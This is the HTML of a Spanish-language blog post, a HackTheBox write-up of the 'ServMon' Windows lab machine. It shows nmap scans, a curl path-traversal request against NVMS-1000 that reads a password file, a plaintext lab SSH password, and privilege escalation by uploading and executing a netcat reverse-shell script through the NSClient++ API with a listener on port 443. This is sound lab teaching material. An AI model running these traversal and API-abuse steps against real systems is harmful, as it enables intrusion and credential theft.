@@ -1,0 +1,889 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - ServMon</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - ServMon | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - ServMon" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Windows nivel fácil. Iremos dando vueltas mediante FTP, exploraremos un Local File Inclusion. Jugaremos con la API del servicio NSClient para conseguir una shell como administrador." />
+<meta property="og:description" content="Máquina Windows nivel fácil. Iremos dando vueltas mediante FTP, exploraremos un Local File Inclusion. Jugaremos con la API del servicio NSClient para conseguir una shell como administrador." />
+<link rel="canonical" href="http://localhost:4000/htb/servmon" />
+<meta property="og:url" content="http://localhost:4000/htb/servmon" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/bannerservmon.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-06-20T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/bannerservmon.png" />
+<meta property="twitter:title" content="HackTheBox - ServMon" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2020-06-20T00:00:00-07:00","datePublished":"2020-06-20T00:00:00-07:00","description":"Máquina Windows nivel fácil. Iremos dando vueltas mediante FTP, exploraremos un Local File Inclusion. Jugaremos con la API del servicio NSClient para conseguir una shell como administrador.","headline":"HackTheBox - ServMon","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/bannerservmon.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/servmon"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/servmon"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - ServMon</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2020-06-20">20 Jun 2020</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/bannerservmon.png" alt="HackTheBox - ServMon">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina Windows nivel fácil. Iremos dando vueltas mediante FTP, exploraremos un Local File Inclusion. Jugaremos con la API del servicio NSClient para conseguir una shell como administrador.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/servmonHTB.png" alt="servmonHTB" /></p>
+
+<h2 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h2>
+
+<p>Esta máquina fue muy interesante, un método de explotación que a mi parecer me dejo loco (por como se hace y por el tiempo que me demore en entenderlo), también a pesar de a veces ser super lenta y que las personas la reiniciaban demasiado por usar un exploit equivocado.</p>
+
+<p>Mediante el servicio <code>FTP</code> encontraremos archivos interesantes, que nos daran algunos usuarios (o posibles rabbit holes :P)
+Explotaremos un <code>Local File Inclusion</code> dentro del servicio <code>NVMS 1000</code>, para asi encontrar un archivo con contraseñas y probarlas con los usuarios obtenidos. Luego con el usuario Nadine, tendremos acceso a la maquina para tener la primera flag.</p>
+
+<p>Despues a traves del servicio <code>NSClient++</code> y del aplicativo <code>nsclient++.ini</code> encontraremos una contraseña, posiblemente del administrador. Y finalmente obtendremos una shell como admin mediante la <code>API</code> del servicio.</p>
+
+<p>…</p>
+
+<h3 id="fases">Fases</h3>
+
+<ol>
+  <li><a href="#enumeracion">Enumeración</a></li>
+  <li><a href="#explotacion">Explotación</a></li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li>
+</ol>
+
+<p>…</p>
+
+<h2 id="enumeracion">Enumeración</h2>
+
+<p>Demosle al escaneo de servicios con los que cuenta el host.</p>
+
+<pre><code class="language-bash">$nmap -v -p- --open --min-rate=5000 -Pn -oG initScan 10.10.10.184
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parametro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Para que nos muestre en la shell lo que va descubriendo</td>
+    </tr>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los puertos</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Muestra solo los puertos abiertos</td>
+    </tr>
+    <tr>
+      <td>-min-rate</td>
+      <td style="text-align: left">Le decimos que no haga peticiones menores a 5000, sin esto, el escaneo va lento</td>
+    </tr>
+    <tr>
+      <td>-Pn</td>
+      <td style="text-align: left">Evitamos que haga resolucion DNS por cada peticion y ademas que haga host discovery (ping)</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo tipo grep, ya veremos por que</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/initScan.jpg" alt="initScan" /></p>
+
+<p>Usaremos una función de <a href="https://www.youtube.com/channel/UCNHWpNqiM8yOQcHXtsluD7Q">S4vitar</a> mediante el cual extraeremos los puertos y con la herramienta xclip a nuestra clipboard, evitando tener que copiar todos los puertos uno a uno.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/extractPorts.jpg" alt="extractPorts" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/outExtractPorts.png" alt="outExtractPorts" /></p>
+
+<pre><code class="language-bash">$nmap -sV -sC -p21,22,80,135,139,445,5666,6063,6699,8443,49667,49669,49670 10.10.10.184 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Param</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver las versiones de los servicios</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/portScan1.png" alt="portScan1" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/portScan2.png" alt="portScan2" /></p>
+
+<p>Tenemos estos servicios corriendo:</p>
+
+<ul>
+  <li>21: FTP, además con el acceso Anonymous habilitado</li>
+  <li>22: SSH, quizás para entrar con algún usuario</li>
+  <li>80: HTTP, Una página web</li>
+  <li>445: Samba</li>
+</ul>
+
+<p>Empezaremos con el servicio FTP</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/ftpAccess.png" alt="ftpAccess" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/ftpDir.png" alt="ftpDir" /></p>
+
+<p>Tenemos 2 archivos y 2 usuarios</p>
+
+<ul>
+  <li>Nathan</li>
+  <li>Nadine</li>
+</ul>
+
+<p>En la interfaz de FTP podemos usar <code>&gt; get &lt;nombredelarchivo&gt;</code> para descargarlo a nuestra ubicación actual.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/ftpFiles.png" alt="ftpFiles" /></p>
+
+<p>Curioso, <strong>Nadine</strong> le indica a <strong>Nathan</strong> que ella dejó el archivo <code>Password.txt</code> en su Escritorio. Por otro lado tenemos unos pasos a realizar, pero no tiene relevancia aún. De acá no tenemos nada más, así que veamos el servidor web.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/webInterface.png" alt="webInterface" /></p>
+
+<p>Podemos inspeccionar, probar credenciales por default en los input, inyectar sentencias SQL, pero no encontramos nada. Vemos algo llamado <code>NVMS-1000</code>, busquemos que es y si podemos encontrar algún exploit.</p>
+
+<blockquote>
+  <p><strong>NVMS-1000</strong> según la busqueda, es un software para el control y gestión de camaras.</p>
+</blockquote>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/nvmsPOCtxt.png" alt="nvmsPOCtxt" /></p>
+
+<p>Encontramos un <code>.txt</code>, relacionando un <strong>Directory Path Traversal</strong>, lo que nos permite ver archivos del sistema en el que está corriendo la página, que normalmente no deberíamos ver.</p>
+
+<p>…</p>
+
+<h2 id="explotacion">Explotación</h2>
+
+<p>Podemos relacionar lo encontrado anteriormente con FTP, ya que sabiendo que <strong>Windows</strong> tiene normalmente en su raíz una carpeta llamada <code>c:\Users</code> y tenemos 2 usuarios, pero realmente uno es el que nos interesa, <code>Nathan</code> y que tiene en su escritorio el archivo <code>Password.txt</code>, entonces realizando la consulta quedaría así.</p>
+
+<p>Usaré cURL:</p>
+
+<pre><code class="language-bash">$curl --path-as-is -v http://10.10.10.184/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-path-as-is</td>
+      <td style="text-align: left">Toma la petición con los “/..”, sin esto hace el request a http://10.10.10.184/Users/Nathan/Desktop/Passwords.txt y pues este path no funciona</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Para ver que está pasando por detrás del request</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/passwordsCurl.png" alt="passwordsCurl" /></p>
+
+<p>Perfecto, tenemos credenciales, veamos si alguna es de algún usuario.</p>
+
+<pre><code class="language-bash">$ssh nadine@10.10.10.184
+
+password: L1k3B1gBut7s@W0rk
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/sshNadine.png" alt="sshNadine" /></p>
+
+<p>Listos, tenemos la flag del usuario. Veamos los últimos 18 caracteres.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/last18charsUsr.png" alt="last18charsUsr" /></p>
+
+<p>…</p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
+
+<p>Basándonos en el escaneo de puertos, recordamos que había un servicio llamado <strong>NSClient++</strong> corriendo sobre el puerto <strong>8443</strong>, ¿De qué trata y que podemos encontrar de él en Windows?</p>
+
+<p>Acá empieza la locura, después de momentos sin entender nada, buscando algún exploit para <strong>NSClient++</strong>, se encontró uno en el que indica que debemos crear un archivo <code>.bat</code> el cual hará una conexión a netcat, con lo que necesitamos subir ese <code>.bat</code>, ponernos en escucha y ejecutarlo para tener una reverse Shell.</p>
+
+<p>Interesante, pero como subimos el archivo… En la <a href="https://docs.nsclient.org/api/rest/">documentación</a> de <strong>NSClient++</strong> hay una <strong>API</strong> en la cual, podemos <strong>subir scripts, ejecutar scripts, borrar, etc..</strong> (También se puede hacer con el entorno gráfico, pero cuando hice la máquina iba muy lento).</p>
+
+<p>Los pasos del <a href="https://www.exploit-db.com/exploits/46802">exploit de nsclient++</a> encontrado:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/nsclientExploit.png" alt="nsclientExploit" /></p>
+
+<p>Buscando por internet, sabemos que el archivo nsclient++.ini guardaba la contraseña del administrador :P</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/passwordAdmin.png" alt="passwordAdmin" /></p>
+
+<p>Siguiendo el POC realizaremos esto:</p>
+
+<ol>
+  <li>Subir <strong>nc.exe</strong> (netcat) y el archivo <code>.bat</code> a <strong>Windows</strong>.</li>
+  <li>Subir el archivo <code>.bat</code> al <strong>NSCLient++</strong> como script con la <strong>API</strong>,</li>
+  <li>Ponernos en escucha mediante <strong>nc (netcat)</strong>, esperando la conexión del script.</li>
+  <li>Ejecutar el script con la ayuda la <strong>API</strong>.</li>
+  <li>Conseguir la Shell como Administrador.</li>
+</ol>
+
+<h4 id="-subir-ncexe-netcat-y-el-archivo-bat-a-windows">&gt; Subir <em>nc.exe</em> (netcat) y el archivo <em>.bat</em> a Windows</h4>
+
+<p>Descargar el ejecutable de netcat desde la web y crear él <em>.bat</em></p>
+
+<p>Usando <code>scp</code> podemos transferir mediante <strong>SSH</strong> archivos, siempre y cuando tengamos credenciales del objetivo.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/creatinganduploadBAT.png" alt="creatinganduploadBAT" /></p>
+
+<h4 id="-subir-el-archivo-bat-al-nsclient-como-script-con-la-api">&gt; Subir el archivo <em>.bat</em> al NSCLient++ como script con la API</h4>
+
+<p>Buscar muy bien en la documentación, entender y hacer, llevo su tiempo, pero fue interesante.</p>
+
+<pre><code class="language-bash">$curl -k -i -u admin https://localhost:8443/api/v1/scripts/ext?all=true
+</code></pre>
+
+<p>Primero vemos los scripts actuales que maneja la app. (Además también para probar que todo va bien :P). Nos va a pedir la pw que ya encontramos en el <strong>nsclient++.ini</strong>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/seeScriptsAPI.png" alt="seeScriptsAPI" /></p>
+
+<p>Listo, ahora lo que haremos será agregar el <em>queesesto.bat</em> como un script</p>
+
+<pre><code class="language-bash">$curl -i -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts\c:\Temp\lana.bat --data-binary @lana.bat
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/addScriptAPI.png" alt="addScriptAPI" /></p>
+
+<p>Acá usamos <strong>PUT</strong> para “poner”, indicándole donde está el archivo y donde queremos subirlo, en este caso en <code>/scripts</code>.</p>
+
+<p>Ahora, como hacemos para ejecutarlo, buscando y buscando, en la documentación hace referencia a <code>/queries</code>, en los cuales dentro de cada uno hay unos atributos y comandos, uno de ellos tiene una instrucción de <strong>ejecución</strong>. Veamos que <em>queries</em> hay.</p>
+
+<pre><code class="language-bash">$curl -k -i -u admin https://localhost:8443/api/v1/queries/
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/queriesGeneralAPI.png" alt="queriesGeneralAPI" /></p>
+
+<p>Al final vemos que se creó un tipo <strong>JSON</strong> con información relacionada con nuestro script.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/queryScriptAPI.png" alt="queryScriptAPI" /></p>
+
+<p>Ya se ve el comando <code>execute</code> y hace referencia al script agregado.</p>
+
+<pre><code class="language-txt">"execute_url":"https://localhost:8443/api/v1/queries/queesesto/commands/execute"
+</code></pre>
+
+<h4 id="-ponernos-en-escucha-mediante-nc-netcat">&gt; Ponernos en escucha mediante <strong>nc (netcat)</strong>.</h4>
+
+<p>Finalmente, poniéndonos en escucha en nuestra máquina por el puerto <strong>443</strong>, que fue el que definimos en el <em>.bat</em> obtendremos la Shell.</p>
+
+<pre><code class="language-bash">$nc -lnvp 443
+</code></pre>
+
+<h4 id="-ejecutar-el-script-con-la-ayuda-de-la-api">&gt; Ejecutar el script con la ayuda de la <strong>API</strong>.</h4>
+
+<pre><code class="language-bash">$curl -k -i -u admin https://localhost:8443/api/v1/queries/queesesto/commands/execute
+</code></pre>
+
+<h4 id="-conseguir-la-shell-como-administrador">&gt; Conseguir la Shell como Administrador.</h4>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/ncOKAdmin.png" alt="ncOKAdmin" /></p>
+
+<p>Y… estamos dentro como usuario administrador :)))))</p>
+
+<blockquote>
+  <p>Debo decir que amé esta forma de intrusión.</p>
+</blockquote>
+
+<p>…</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/last11charsAdmin.png" alt="last11charsAdmin" /></p>
+
+<p>Buena maquina, en su momento estaba muy lenta y además las personas por seguir el exploit de internet al pie de la letra pues reseteaban la máquina, lo cual hacia peor el proceso. Pero bueno, encantado y muchas gracias por leer.</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - ServMon&url=http://localhost:4000/htb/servmon" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#API">API</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#FTP">FTP</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#LFI">LFI</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#NSClient">NSClient</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/waldo">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149banner.png" alt="HackTheBox - Waldo"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/waldo">HackTheBox - Waldo</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina linux nivel medio. Los lindos LFI, jugueteo con SSH, llaves privadas traviesas, bypass de shells restringidas yyyyyy cositas con las CAPAcidades BILITIESas.
+
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">09 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/crimestoppers">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120banner.png" alt="HackTheBox - CrimeStoppers"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/crimestoppers">HackTheBox - CrimeStoppers</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel difícil. Explotación web con filtros (wrappers) consiguiendo LFI y RCE, contraseñas de Thunderbird, correos llenos de odio, persistencias locas (un rootkit) y jugueteo entre reversing y criptografía....</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">08 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/carrier">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155banner.png" alt="HackTheBox - Carrier"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/carrier">HackTheBox - Carrier</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel medio. Enumeraremos bastante y leeremos más. Jugaremos con SNMP, inyección de comandos de un proceso en la web yyyyyy una locura llamada BGP Hijacking. Interceptaremos el tráfico...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">29 Jul 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
